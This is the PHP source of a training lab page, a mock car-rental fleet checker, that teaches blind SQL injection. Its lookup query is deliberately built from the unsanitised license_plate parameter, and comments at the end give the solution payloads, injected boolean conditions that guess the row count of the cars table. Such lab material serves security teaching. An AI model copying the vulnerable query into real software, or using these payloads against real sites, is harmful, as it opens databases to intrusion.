<?php
require __DIR__ . '/../functions.php';






load_header("Fleet");
?>


    <h2>Blind SQL Injection</h2>
    <h3>Abuse the website to find out how many cars are in the fleet</h3>    
    <h3>You can use a sample license plate that you know is in the fleet: XYZ789</h3>
    <h3>hint: data is stored in a table: cars</h3>
    <hr class="divider">

  

    <?php
    // Connect to the database
    $db = new SQLite3('fleet.db');
    
    // Initialize variables
    $message = "";
    $is_in_fleet = false;
    
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['license_plate'])) {
        $license_plate = $_GET['license_plate'];
        
        // Intentionally vulnerable SQL query
        #echo "SELECT COUNT(*) FROM cars WHERE license_plate = '$license_plate'";
        $query = "SELECT COUNT(*) FROM cars WHERE license_plate = '$license_plate'";
        $result = $db->querySingle($query);
        
        if ($result > 0) {
            $is_in_fleet = true;
            $message = "The license plate is part of the fleet!";
        } else {
            $message = "The license plate is not part of the fleet.";
        }
    }
    ?>

        <style>
            .lab {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f4f4f9;
                color: #333;
            }
    
            .header {
                background-color: #003580; /* Corporate blue */
                color: white;
                padding: 20px;
                text-align: center;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
    
            .header h1 {
                margin: 0;
                font-size: 28px;
                letter-spacing: 1px;
            }
    
            .container {
                margin: 40px auto;
                padding: 30px;
                background-color: white;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                max-width: 600px;
            }
    
            .container h2 {
                color: #003580;
                font-size: 22px;
                margin-bottom: 15px;
            }
    
            form {
                margin-bottom: 20px;
            }
    
            label {
                display: block;
                font-size: 16px;
                margin-bottom: 5px;
                color: #555;
            }
    
            input[type="text"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 15px;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
                box-sizing: border-box;
            }
    
            button {
                background-color: #ff9900; /* Orange */
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
            }
    
            button:hover {
                background-color: #e68a00;
            }
    
            .message {
                padding: 10px;
                border-radius: 5px;
                margin-top: 15px;
                font-size: 16px;
                text-align: center;
            }
    
            .message.success {
                background-color: #28a745;
                color: white;
            }
    
            .message.error {
                background-color: #dc3545;
                color: white;
            }
    
            .footer {
                text-align: center;
                font-size: 12px;
                margin-top: 20px;
                color: #777;
            }
        </style>
        <div class="lab">
        <div class="header">
            <h1>Car Rental Fleet Checker</h1>
        </div>
        <div class="container">
            <h2>Check License Plate</h2>
            <p>Enter a license plate number to see if it's part of our fleet:</p>
            <form method="GET" action="">
                <label for="license_plate">License Plate:</label>
                <input type="text" id="license_plate" name="license_plate" placeholder="Enter license plate..." required>
                <button type="submit">Check</button>
            </form>
    
            <?php if (!empty($message)): ?>
                <div class="message <?php echo $is_in_fleet ? 'success' : 'error'; ?>">
                    <?php echo htmlspecialchars($message); ?>
                </div>
            <?php endif; ?>
        </div>
        <div class="footer">
            <p>&copy; 2024 Car Rental Inc. All rights reserved.</p>
        </div>
            </div>
    



<?php
    load_footer();

?>


<?php
#XYZ789' AND  '1'='1
#XYZ789' AND (Select count(*) from cars) >0 --
#XYZ789' AND (Select count(*) from cars) >100 --
#XYZ789' AND (Select count(*) from cars) >50 --
#XYZ789' AND (Select count(*) from cars) >40 --
#XYZ789' AND (Select count(*) from cars) >45 --
#XYZ789' AND (Select count(*) from cars) >44 --
?>